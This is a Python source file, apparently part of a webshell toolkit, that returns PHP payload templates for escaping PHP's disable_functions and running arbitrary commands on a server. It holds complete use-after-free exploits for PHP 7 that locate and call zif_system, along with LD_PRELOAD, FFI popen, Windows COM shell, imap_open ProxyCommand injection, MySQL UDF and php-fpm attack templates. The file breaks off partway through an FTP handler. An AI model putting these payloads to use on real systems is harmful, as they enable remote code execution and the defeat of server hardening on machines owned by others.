
def get_php_system(bdf_mode):
    if bdf_mode == 1:  # php7-backtrace
        return """$o=pwn(base64_decode("%s"));
        function pwn($cmd) {
            global $abc, $helper, $backtrace;

            class Vuln {
                public $a;
                public function __destruct() {
                    global $backtrace;
                    unset($this->a);
                    if (class_exists('Exception')) {
                    $backtrace = (new Exception)->getTrace();
                        if(!isset($backtrace[1]['args'])) {
                            $backtrace = debug_backtrace();
                        }
                    } else {
                    $backtrace = (new Error)->getTrace();
                    }
                }
            }

            class Helper {
                public $a, $b, $c, $d;
            }

            function str2ptr(&$str, $p = 0, $s = 8) {
                $address = 0;
                for($j = $s-1; $j >= 0; $j--) {
                    $address <<= 8;
                    $address |= ord($str[$p+$j]);
                }
                return $address;
            }

            function ptr2str($ptr, $m = 8) {
                $out = "";
                for ($i=0; $i < $m; $i++) {
                    $out .= chr($ptr & 0xff);
                    $ptr >>= 8;
                }
                return $out;
            }

            function write(&$str, $p, $v, $n = 8) {
                $i = 0;
                for($i = 0; $i < $n; $i++) {
                    $str[$p + $i] = chr($v & 0xff);
                    $v >>= 8;
                }
            }

            function leak($addr, $p = 0, $s = 8) {
                global $abc, $helper;
                write($abc, 0x68, $addr + $p - 0x10);
                $leak = strlen($helper->a);
                if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
                return $leak;
            }

            function parse_elf($base) {
                $e_type = leak($base, 0x10, 2);

                $e_phoff = leak($base, 0x20);
                $e_phentsize = leak($base, 0x36, 2);
                $e_phnum = leak($base, 0x38, 2);

                for($i = 0; $i < $e_phnum; $i++) {
                    $header = $base + $e_phoff + $i * $e_phentsize;
                    $p_type  = leak($header, 0, 4);
                    $p_flags = leak($header, 4, 4);
                    $p_vaddr = leak($header, 0x10);
                    $p_memsz = leak($header, 0x28);

                    if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                        # handle pie
                        $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                        $data_size = $p_memsz;
                    } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                        $text_size = $p_memsz;
                    }
                }

                if(!$data_addr || !$text_size || !$data_size)
                    return false;

                return [$data_addr, $text_size, $data_size];
            }

            function get_basic_funcs($base, $elf) {
                list($data_addr, $text_size, $data_size) = $elf;
                for($i = 0; $i < $data_size / 8; $i++) {
                    $leak = leak($data_addr, $i * 8);
                    if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                        $deref = leak($leak);
                        # 'constant' constant check
                        if($deref != 0x746e6174736e6f63)
                            continue;
                    } else continue;

                    $leak = leak($data_addr, ($i + 4) * 8);
                    if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                        $deref = leak($leak);
                        # 'bin2hex' constant check
                        if($deref != 0x786568326e6962)
                            continue;
                    } else continue;

                    return $data_addr + $i * 8;
                }
            }

            function get_binary_base($binary_leak) {
                $base = 0;
                $start = $binary_leak & 0xfffffffffffff000;
                for($i = 0; $i < 0x1000; $i++) {
                    $addr = $start - 0x1000 * $i;
                    $leak = leak($addr, 0, 7);
                    if($leak == 0x10102464c457f) { # ELF header
                        return $addr;
                    }
                }
            }

            function get_system($basic_funcs) {
                $addr = $basic_funcs;
                do {
                    $f_entry = leak($addr);
                    $f_name = leak($f_entry, 0, 6);

                    if($f_name == 0x6d6574737973) { # system
                        return leak($addr + 8);
                    }
                    $addr += 0x20;
                } while($f_entry != 0);
                return false;
            }

            function trigger_uaf($arg) {
                # str_shuffle prevents opcache string interning
                $arg = str_shuffle(str_repeat('A', 79));
                $vuln = new Vuln();
                $vuln->a = $arg;
            }

            if(stristr(PHP_OS, 'WIN')) {
                die('This PoC is for *nix systems only.');
            }

            $n_alloc = 10; # increase this value if UAF fails
            $contiguous = [];
            for($i = 0; $i < $n_alloc; $i++)
                $contiguous[] = str_shuffle(str_repeat('A', 79));

            trigger_uaf('x');
            $abc = $backtrace[1]['args'][0];

            $helper = new Helper;
            $helper->b = function ($x) { };

            if(strlen($abc) == 79 || strlen($abc) == 0) {
                die("UAF failed");
            }

            # leaks
            $closure_handlers = str2ptr($abc, 0);
            $php_heap = str2ptr($abc, 0x58);
            $abc_addr = $php_heap - 0xc8;

            # fake value
            write($abc, 0x60, 2);
            write($abc, 0x70, 6);

            # fake reference
            write($abc, 0x10, $abc_addr + 0x60);
            write($abc, 0x18, 0xa);

            $closure_obj = str2ptr($abc, 0x20);

            $binary_leak = leak($closure_handlers, 8);
            if(!($base = get_binary_base($binary_leak))) {
                die("bdf error: Couldn't determine binary base address");
            }

            if(!($elf = parse_elf($base))) {
                die("bdf error: Couldn't parse ELF header");
            }

            if(!($basic_funcs = get_basic_funcs($base, $elf))) {
                die("bdf error: Couldn't get basic_functions address");
            }

            if(!($zif_system = get_system($basic_funcs))) {
                die("bdf error: Couldn't get zif_system address");
            }

            # fake closure object
            $fake_obj_offset = 0xd0;
            for($i = 0; $i < 0x110; $i += 8) {
                write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
            }

            write($abc, 0x20, $abc_addr + $fake_obj_offset);
            write($abc, 0xd0 + 0x38, 1, 4); # internal func type
            write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
            ob_start();
            ($helper->b)($cmd);
            $o=ob_get_contents();
            ob_end_clean();
            %s
            return $o;
        }"""
    if bdf_mode == 2:  # php7-gc
        return """
        $o=pwn(base64_decode("%s"));

        function pwn($cmd) {
            global $abc, $helper;

            function str2ptr(&$str, $p = 0, $s = 8) {
                $address = 0;
                for($j = $s-1; $j >= 0; $j--) {
                    $address <<= 8;
                    $address |= ord($str[$p+$j]);
                }
                return $address;
            }

            function ptr2str($ptr, $m = 8) {
                $out = "";
                for ($i=0; $i < $m; $i++) {
                    $out .= chr($ptr & 0xff);
                    $ptr >>= 8;
                }
                return $out;
            }

            function write(&$str, $p, $v, $n = 8) {
                $i = 0;
                for($i = 0; $i < $n; $i++) {
                    $str[$p + $i] = chr($v & 0xff);
                    $v >>= 8;
                }
            }

            function leak($addr, $p = 0, $s = 8) {
                global $abc, $helper;
                write($abc, 0x68, $addr + $p - 0x10);
                $leak = strlen($helper->a);
                if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
                return $leak;
            }

            function parse_elf($base) {
                $e_type = leak($base, 0x10, 2);

                $e_phoff = leak($base, 0x20);
                $e_phentsize = leak($base, 0x36, 2);
                $e_phnum = leak($base, 0x38, 2);

                for($i = 0; $i < $e_phnum; $i++) {
                    $header = $base + $e_phoff + $i * $e_phentsize;
                    $p_type  = leak($header, 0, 4);
                    $p_flags = leak($header, 4, 4);
                    $p_vaddr = leak($header, 0x10);
                    $p_memsz = leak($header, 0x28);

                    if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                        # handle pie
                        $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                        $data_size = $p_memsz;
                    } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                        $text_size = $p_memsz;
                    }
                }

                if(!$data_addr || !$text_size || !$data_size)
                    return false;

                return [$data_addr, $text_size, $data_size];
            }

            function get_basic_funcs($base, $elf) {
                list($data_addr, $text_size, $data_size) = $elf;
                for($i = 0; $i < $data_size / 8; $i++) {
                    $leak = leak($data_addr, $i * 8);
                    if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                        $deref = leak($leak);
                        # 'constant' constant check
                        if($deref != 0x746e6174736e6f63)
                            continue;
                    } else continue;

                    $leak = leak($data_addr, ($i + 4) * 8);
                    if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                        $deref = leak($leak);
                        # 'bin2hex' constant check
                        if($deref != 0x786568326e6962)
                            continue;
                    } else continue;

                    return $data_addr + $i * 8;
                }
            }

            function get_binary_base($binary_leak) {
                $base = 0;
                $start = $binary_leak & 0xfffffffffffff000;
                for($i = 0; $i < 0x1000; $i++) {
                    $addr = $start - 0x1000 * $i;
                    $leak = leak($addr, 0, 7);
                    if($leak == 0x10102464c457f) { # ELF header
                        return $addr;
                    }
                }
            }

            function get_system($basic_funcs) {
                $addr = $basic_funcs;
                do {
                    $f_entry = leak($addr);
                    $f_name = leak($f_entry, 0, 6);

                    if($f_name == 0x6d6574737973) { # system
                        return leak($addr + 8);
                    }
                    $addr += 0x20;
                } while($f_entry != 0);
                return false;
            }

            class ryat {
                var $ryat;
                var $chtg;
                function __destruct()
                {
                    $this->chtg = $this->ryat;
                    $this->ryat = 1;
                }
            }

            class Helper {
                public $a, $b, $c, $d;
            }

            if(stristr(PHP_OS, 'WIN')) {
                die('This PoC is for *nix systems only.');
            }

            $n_alloc = 10; # increase this value if you get segfaults

            $contiguous = [];
            for($i = 0; $i < $n_alloc; $i++)
                $contiguous[] = str_repeat('A', 79);

            $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
            $out = unserialize($poc);
            gc_collect_cycles();

            $v = [];
            $v[0] = ptr2str(0, 79);
            unset($v);
            $abc = $out[2][0];

            $helper = new Helper;
            $helper->b = function ($x) { };

            if(strlen($abc) == 79 || strlen($abc) == 0) {
                die("UAF failed");
            }

            # leaks
            $closure_handlers = str2ptr($abc, 0);
            $php_heap = str2ptr($abc, 0x58);
            $abc_addr = $php_heap - 0xc8;

            # fake value
            write($abc, 0x60, 2);
            write($abc, 0x70, 6);

            # fake reference
            write($abc, 0x10, $abc_addr + 0x60);
            write($abc, 0x18, 0xa);

            $closure_obj = str2ptr($abc, 0x20);

            $binary_leak = leak($closure_handlers, 8);
            if(!($base = get_binary_base($binary_leak))) {
                die("Couldn't determine binary base address");
            }

            if(!($elf = parse_elf($base))) {
                die("Couldn't parse ELF header");
            }

            if(!($basic_funcs = get_basic_funcs($base, $elf))) {
                die("Couldn't get basic_functions address");
            }

            if(!($zif_system = get_system($basic_funcs))) {
                die("Couldn't get zif_system address");
            }

            # fake closure object
            $fake_obj_offset = 0xd0;
            for($i = 0; $i < 0x110; $i += 8) {
                write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
            }

            # pwn
            write($abc, 0x20, $abc_addr + $fake_obj_offset);
            write($abc, 0xd0 + 0x38, 1, 4); # internal func type
            write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
            ob_start();
            ($helper->b)($cmd);
            $o=ob_get_contents();
            ob_end_clean();
            %s
            return $o;
        }"""
    if bdf_mode == 3:  # php7-json
        return """
            $cmd = base64_decode("%s");
            $n_alloc = 10; # increase this value if you get segfaults

            class MySplFixedArray extends SplFixedArray {
                public static $leak;
            }

            class Z implements JsonSerializable {
                public function write(&$str, $p, $v, $n = 8) {
                  $i = 0;
                  for($i = 0; $i < $n; $i++) {
                    $str[$p + $i] = chr($v & 0xff);
                    $v >>= 8;
                  }
                }

                public function str2ptr(&$str, $p = 0, $s = 8) {
                    $address = 0;
                    for($j = $s-1; $j >= 0; $j--) {
                        $address <<= 8;
                        $address |= ord($str[$p+$j]);
                    }
                    return $address;
                }

                public function ptr2str($ptr, $m = 8) {
                    $out = "";
                    for ($i=0; $i < $m; $i++) {
                        $out .= chr($ptr & 0xff);
                        $ptr >>= 8;
                    }
                    return $out;
                }

                # unable to leak ro segments
                public function leak1($addr) {
                    global $spl1;

                    $this->write($this->abc, 8, $addr - 0x10);
                    return strlen(get_class($spl1));
                }

                # the real deal
                public function leak2($addr, $p = 0, $s = 8) {
                    global $spl1, $fake_tbl_off;

                    # fake reference zval
                    # gc_refcounted
                    $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef);
                    $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
                    $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

                    $leak = strlen($spl1::$leak);
                    if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }

                    return $leak;
                }

                public function parse_elf($base) {
                    $e_type = $this->leak2($base, 0x10, 2);

                    $e_phoff = $this->leak2($base, 0x20);
                    $e_phentsize = $this->leak2($base, 0x36, 2);
                    $e_phnum = $this->leak2($base, 0x38, 2);

                    for($i = 0; $i < $e_phnum; $i++) {
                        $header = $base + $e_phoff + $i * $e_phentsize;
                        $p_type  = $this->leak2($header, 0, 4);
                        $p_flags = $this->leak2($header, 4, 4);
                        $p_vaddr = $this->leak2($header, 0x10);
                        $p_memsz = $this->leak2($header, 0x28);

                        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                            # handle pie
                            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                            $data_size = $p_memsz;
                        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                            $text_size = $p_memsz;
                        }
                    }

                    if(!$data_addr || !$text_size || !$data_size)
                        return false;

                    return [$data_addr, $text_size, $data_size];
                }

                public function get_basic_funcs($base, $elf) {
                    list($data_addr, $text_size, $data_size) = $elf;
                    for($i = 0; $i < $data_size / 8; $i++) {
                        $leak = $this->leak2($data_addr, $i * 8);
                        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                            $deref = $this->leak2($leak);
                            # 'constant' constant check
                            if($deref != 0x746e6174736e6f63)
                                continue;
                        } else continue;

                        $leak = $this->leak2($data_addr, ($i + 4) * 8);
                        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                            $deref = $this->leak2($leak);
                            # 'bin2hex' constant check
                            if($deref != 0x786568326e6962)
                                continue;
                        } else continue;

                        return $data_addr + $i * 8;
                    }
                }

                public function get_binary_base($binary_leak) {
                    $base = 0;
                    $start = $binary_leak & 0xfffffffffffff000;
                    for($i = 0; $i < 0x1000; $i++) {
                        $addr = $start - 0x1000 * $i;
                        $leak = $this->leak2($addr, 0, 7);
                        if($leak == 0x10102464c457f) { # ELF header
                            return $addr;
                        }
                    }
                }

                public function get_system($basic_funcs) {
                    $addr = $basic_funcs;
                    do {
                        $f_entry = $this->leak2($addr);
                        $f_name = $this->leak2($f_entry, 0, 6);

                        if($f_name == 0x6d6574737973) { # system
                            return $this->leak2($addr + 8);
                        }
                        $addr += 0x20;
                    } while($f_entry != 0);
                    return false;
                }

                public function jsonSerialize() {
                    global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

                    $contiguous = [];
                    for($i = 0; $i < $n_alloc; $i++)
                        $contiguous[] = new DateInterval('PT1S');

                    $room = [];
                    for($i = 0; $i < $n_alloc; $i++)
                        $room[] = new Z();

                    $_protector = $this->ptr2str(0, 78);

                    $this->abc = $this->ptr2str(0, 79);
                    $p = new DateInterval('PT1S');

                    unset($y[0]);
                    unset($p);

                    $protector = ".$_protector";

                    $x = new DateInterval('PT1S');
                    $x->d = 0x2000;
                    $x->h = 0xdeadbeef;
                    # $this->abc is now of size 0x2000

                    if($this->str2ptr($this->abc) != 0xdeadbeef) {
                        die('UAF failed.');
                    }

                    $spl1 = new MySplFixedArray();
                    $spl2 = new MySplFixedArray();

                    # some leaks
                    $class_entry = $this->str2ptr($this->abc, 0x120);
                    $handlers = $this->str2ptr($this->abc, 0x128);
                    $php_heap = $this->str2ptr($this->abc, 0x1a8);
                    $abc_addr = $php_heap - 0x218;

                    # create a fake class_entry
                    $fake_obj = $abc_addr;
                    $this->write($this->abc, 0, 2); # type
                    $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

                    # copy some of class_entry definition
                    for($i = 0; $i < 16; $i++) {
                        $this->write($this->abc, 0x10 + $i * 8,
                            $this->leak1($class_entry + 0x10 + $i * 8));
                    }

                    # fake static members table
                    $fake_tbl_off = 0x70 * 4 - 16;
                    $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
                    $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

                    # fake zval_reference
                    # zval
                    $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10);
                    # zval type (reference)
                    $this->write($this->abc, $fake_tbl_off + 8, 10);

                    # look for binary base
                    $binary_leak = $this->leak2($handlers + 0x10);
                    if(!($base = $this->get_binary_base($binary_leak))) {
                        die("Couldn't determine binary base address");
                    }

                    # parse elf header
                    if(!($elf = $this->parse_elf($base))) {
                        die("Couldn't parse ELF");
                    }

                    # get basic_functions address
                    if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
                        die("Couldn't get basic_functions address");
                    }

                    # find system entry
                    if(!($zif_system = $this->get_system($basic_funcs))) {
                        die("Couldn't get zif_system address");
                    }

                    # copy hashtable offsetGet bucket
                    $fake_bkt_off = 0x70 * 5 - 16;

                    $function_data = $this->str2ptr($this->abc, 0x50);
                    for($i = 0; $i < 4; $i++) {
                        $this->write($this->abc, $fake_bkt_off + $i * 8,
                            $this->leak2($function_data + 0x40 * 4, $i * 8));
                    }

                    # create a fake bucket
                    $fake_bkt_addr = $abc_addr + $fake_bkt_off;
                    $this->write($this->abc, 0x50, $fake_bkt_addr);
                    for($i = 0; $i < 3; $i++) {
                        $this->write($this->abc, 0x58 + $i * 4, 1, 4);
                    }

                    # copy bucket zval
                    $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
                    for($i = 0; $i < 12; $i++) {
                        $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8,
                            $this->leak2($function_zval, $i * 8));
                    }

                    # pwn
                    $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
                    $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
                    ob_start();
                    $spl1->offsetGet($cmd);
                    $o=ob_get_contents();
                    ob_end_clean();
                    %s
                    $GLOBAL['o']=$o;
                }
            }

            $y = [new Z()];
            json_encode([&$y]);
            $o=$GLOBAL['o'];"""
    if bdf_mode == 4:  # LD_PRELOAD
        return """
            $p="/tmp/%s";
            putenv("cmd=".base64_decode("%s"));
            putenv("rpath=$p");
            putenv("LD_PRELOAD=%s");
            %s
            $o=file_get_contents($p);
            unlink($p);
            %s"""
    if bdf_mode == 5:  # FFI
        return """
            $f=FFI::cdef("void *popen(const char *command, const char *type);
            int pclose(void * stream);
            int fgetc (void *fp);","libc.so.6");
            $o=$f->popen(base64_decode("%s"),"r");
            $d="";while(($c=$f->fgetc($o))!=-1)
            {$d.=str_pad(strval(dechex($c)),2,"0",0);}
            $f->pclose($o);
            $o=hex2bin($d);
            %s"""
    if bdf_mode == 6:  # COM
        return """
            $wsh = new COM('WScript.shell');
            $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
            $stdout = $exec->StdOut();
            $o = $stdout->ReadAll();
            %s"""
    if bdf_mode == 7:  # imap_open
        return """
            if (!function_exists('imap_open')) {print("no imap_open function!");}
            else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
            imap_open('{' . $server . ':143/imap}INBOX', '', '');
            sleep(1);
            $o=file_get_contents("/tmp/%s");
            %s
            unlink("/tmp/%s");}"""
    if bdf_mode == 8:  # MYSQL-UDF
        return {"pdo": """"
            try{%s
                $r=$con->query("select sys_eval(unhex('%s'))");
                $rr=$r->fetch();
                $o=$rr[0];
                $GLOBAL['o']=$o;
                %s
                } catch (PDOException $e){
            }""", "mysql": """"%s
            if ($con)
            {
                $r=$con->query(select sys_eval(unhex('%s')));
                $rr=$r->fetch_all(MYSQLI_NUM);
                $o=$rr[0];
                $GLOBAL['o']=$o;
                %s
                $r->close();
                $con->close();
            }"""}
    if bdf_mode == 9:  # php7-SplDoublyLinkedList
        return """
            error_reporting(E_ALL);

            define('NB_DANGLING', 200);
            define('SIZE_ELEM_STR', 40 - 24 - 1);
            define('STR_MARKER', 0xcf5ea1);

            function i2s(&$s, $p, $i, $x=8)
            {
                for($j=0;$j<$x;$j++)
                {
                    $s[$p+$j] = chr($i & 0xff);
                    $i >>= 8;
                }
            }


            function s2i(&$s, $p, $x=8)
            {
                $i = 0;

                for($j=$x-1;$j>=0;$j--)
                {
                    $i <<= 8;
                    $i |= ord($s[$p+$j]);
                }

                return $i;
            }


            class UAFTrigger
            {
                function __construct($cmd)
                {
                    $this->cmd=$cmd;
                }
                function __destruct()
                {
                    global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;

                    $dlls[NB_DANGLING]->offsetUnset(0);

                    # At this point every $dll->current points to the same freed chunk. We allocate
                    # that chunk with a string, and fill the zval part
                    $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
                    i2s($fake_dll_element, 0x00, 0x12345678); # ptr
                    i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff

                    # Each of these dlls current->next pointers point to the same location,
                    # the string we allocated. When calling next(), our fake element becomes
                    # the current value, and as such its rc is incremented. Since rc is at
                    # the same place as zend_string.len, the length of the string gets bigger,
                    # allowing to R/W any part of the following memory
                    for($i = 0; $i <= NB_DANGLING; $i++)
                        $dlls[$i]->next();

                    if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
                        die('Exploit failed: fake_dll_element did not increase in size');

                    $leaked_str_offsets = [];
                    $leaked_str_zval = [];

                    # In the memory after our fake element, that we can now read and write,
                    # there are lots of zend_string chunks that we allocated. We keep three,
                    # and we keep track of their offsets.
                    for($offset = SIZE_ELEM_STR + 1; $offset <= strlen($fake_dll_element) - 40; $offset += 40)
                    {
                        # If we find a string marker, pull it from the string list
                        if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)
                        {
                            $leaked_str_offsets[] = $offset;
                            $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];
                            if(count($leaked_str_zval) == 3)
                                break;
                        }
                    }

                    if(count($leaked_str_zval) != 3)
                        die('Exploit failed: unable to leak three zend_strings');

                    # free the strings, except the three we need
                    $strs = null;

                    # Leak adress of first chunk
                    unset($leaked_str_zval[0]);
                    unset($leaked_str_zval[1]);
                    unset($leaked_str_zval[2]);
                    $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);

                    # At this point we have 3 freed chunks of size 40, which we can read/write,
                    # and we know their address.

                    # In the third one, we will allocate a DLL element which points to a zend_array
                    $rw_dll->push([3]);
                    $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
                    # Change the zval type from zend_object to zend_string
                    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
                    if(gettype($rw_dll[0]) != 'string')
                        die('Exploit failed: Unable to change zend_array to zend_string');

                    # We can now read anything: if we want to read 0x11223300, we make zend_string*
                    # point to 0x11223300-0x10, and read its size using strlen()

                    # Read zend_array->pDestructor
                    $zval_ptr_dtor_addr = read($array_addr + 0x30);


                    # Use it to find zif_system
                    $system_addr = get_system_address($zval_ptr_dtor_addr);

                    # In the second freed block, we create a closure and copy the zend_closure struct
                    # to a string
                    $rw_dll->push(function ($x) {});
                    $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
                    $data = str_shuffle(str_repeat('A', 0x200));

                    for($i = 0; $i < 0x138; $i += 8)
                    {
                        i2s($data, $i, read($closure_addr + $i));
                    }

                    # Change internal func type and pointer to make the closure execute system instead
                    i2s($data, 0x38, 1, 4);
                    i2s($data, 0x68, $system_addr);

                    # Push our string, which contains a fake zend_closure, in the last freed chunk that
                    # we control, and make the second zval point to it.
                    $rw_dll->push($data);
                    $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
                    i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);

                    # Calling it now
                    ob_start();
                    $rw_dll[1]($this->cmd);
                    $o=ob_get_contents();
                    ob_end_clean();
                    %s
                }
            }

            class DanglingTrigger
            {
                function __construct($i)
                {
                    $this->i = $i;
                }

                function __destruct()
                {
                    global $dlls;
                    $dlls[$this->i]->offsetUnset(0);
                    $dlls[$this->i+1]->push(123);
                    $dlls[$this->i+1]->offsetUnset(0);
                }
            }

            class SystemExecutor extends ArrayObject
            {
                function offsetGet($x)
                {
                    parent::offsetGet($x);
                }
            }

            /**
             * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
             * and setting its type to zend_string, so that zend_string->len points to the value
             * we want to read.
             */
            function read($addr, $s=8)
            {
                global $fake_dll_element, $leaked_str_offsets, $rw_dll;

                i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
                i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);

                $value = strlen($rw_dll[0]);

                if($s != 8)
                    $value &= (1 << ($s << 3)) - 1;

                return $value;
            }

            function get_binary_base($binary_leak)
            {
                $base = 0;
                $start = $binary_leak & 0xfffffffffffff000;
                for($i = 0; $i < 0x1000; $i++)
                {
                    $addr = $start - 0x1000 * $i;
                    $leak = read($addr, 7);
                    # ELF header
                    if($leak == 0x10102464c457f)
                        return $addr;
                }
                # We'll crash before this but it's clearer this way
                die('Exploit failed: Unable to find ELF header');
            }

            function parse_elf($base)
            {
                $e_type = read($base + 0x10, 2);

                $e_phoff = read($base + 0x20);
                $e_phentsize = read($base + 0x36, 2);
                $e_phnum = read($base + 0x38, 2);

                for($i = 0; $i < $e_phnum; $i++) {
                    $header = $base + $e_phoff + $i * $e_phentsize;
                    $p_type  = read($header + 0x00, 4);
                    $p_flags = read($header + 0x04, 4);
                    $p_vaddr = read($header + 0x10);
                    $p_memsz = read($header + 0x28);

                    if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                        # handle pie
                        $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                        $data_size = $p_memsz;
                    } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                        $text_size = $p_memsz;
                    }
                }

                if(!$data_addr || !$text_size || !$data_size)
                    die('Exploit failed: Unable to parse ELF');

                return [$data_addr, $text_size, $data_size];
            }

            function get_basic_funcs($base, $elf) {
                list($data_addr, $text_size, $data_size) = $elf;
                for($i = 0; $i < $data_size / 8; $i++) {
                    $leak = read($data_addr + $i * 8);
                    if($leak - $base > 0 && $leak < $data_addr) {
                        $deref = read($leak);
                        # 'constant' constant check
                        if($deref != 0x746e6174736e6f63)
                            continue;
                    } else continue;

                    $leak = read($data_addr + ($i + 4) * 8);
                    if($leak - $base > 0 && $leak < $data_addr) {
                        $deref = read($leak);
                        # 'bin2hex' constant check
                        if($deref != 0x786568326e6962)
                            continue;
                    } else continue;

                    return $data_addr + $i * 8;
                }
            }

            function get_system($basic_funcs)
            {
                $addr = $basic_funcs;
                do {
                    $f_entry = read($addr);
                    $f_name = read($f_entry, 6);

                    if($f_name == 0x6d6574737973) { # system
                        return read($addr + 8);
                    }
                    $addr += 0x20;
                } while($f_entry != 0);
                return false;
            }

            function get_system_address($binary_leak)
            {
                $base = get_binary_base($binary_leak);
                $elf = parse_elf($base);
                $basic_funcs = get_basic_funcs($base, $elf);
                $zif_system = get_system($basic_funcs);
                return $zif_system;
            }

            define('NB_STRS', 50);

            $dlls = [];
            $strs = [];
            $rw_dll = new SplDoublyLinkedList();


            # Create a chain of dangling triggers, which will all in turn
            # free current->next, push an element to the next list, and free current
            # This will make sure that every current->next points the same memory block,
            # which we will UAF.
            for($i = 0; $i < NB_DANGLING; $i++)
            {
                $dlls[$i] = new SplDoublyLinkedList();
                $dlls[$i]->push(new DanglingTrigger($i));
                $dlls[$i]->rewind();
            }

            # We want our UAF'd list element to be before two strings, so that we can
            # obtain the address of the first string, and increase is size. We then have
            # R/W over all memory after the obtained address.

            for($i = 0; $i < NB_STRS; $i++)
            {
                $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
                i2s($strs[$i], 0, STR_MARKER);
                i2s($strs[$i], 8, $i, 7);
            }

            # Free one string in the middle, ...
            $strs[NB_STRS - 20] = 123;
            # ... and put the to-be-UAF'd list element instead.
            $dlls[0]->push(0);

            # Setup the last DLlist, which will exploit the UAF
            $dlls[NB_DANGLING] = new SplDoublyLinkedList();
            $dlls[NB_DANGLING]->push(new UAFTrigger(base64_decode("%s")));
            $dlls[NB_DANGLING]->rewind();

            # Trigger the bug on the first list
            $dlls[0]->offsetUnset(0);"""
    if bdf_mode == 10:  # php-fpm
        return {
            "gopher": """function curl($url){
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_exec($ch);
                curl_close($ch);
                }
                ob_start();curl("%s");$o=ob_get_clean();%s
                """,
            "sock": """if(function_exists('stream_socket_client') && file_exists($sock_path)){
                    $sock=stream_socket_client("unix://".$sock_path);
                    } else {
                    die('stream_socket_client function not exist or sock not exist');
                    }""",
            "http_sock": """
                if(function_exists('fsockopen')){
                    $sock=fsockopen($host, $port, $errno, $errstr, 1);
                } else if(function_exists('pfsockopen')){
                    $sock=pfsockopen($host, $port, $errno, $errstr, 1);
                } else if(function_exists('stream_socket_client')) {
                    $sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
                } else {
                    die('fsockopen/pfsockopen/stream_socket_client function not exist');
                }""",
            "ftp":
                """
                if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
                $ftp_table = [
                    "USER" => "331 Username ok, send password.\\r\\n",
                    "PASS" => "230 Login successful.\\r\\n",
                    "TYPE" => "200 Type set to: Binary.\\r\\n",
                    "SIZE" => "550 /test is not retrievable.\\r\\n",
                    "EPSV" => "500 'EPSV': command not understood.\\r\\n",
                    "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
                    "STOR" => "150 File status okay. About to open data connection.\\r\\n",
                ];
                $server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
                $accept = stream_socket_accept($server);
                fwrite($accept, "200 OK\\r\\n");
                while (true) {
                    $data = fgets($accept);
                    $cmd = substr($data, 0, 4);
                    if (array_key_exists($cmd, $ftp_table)) {
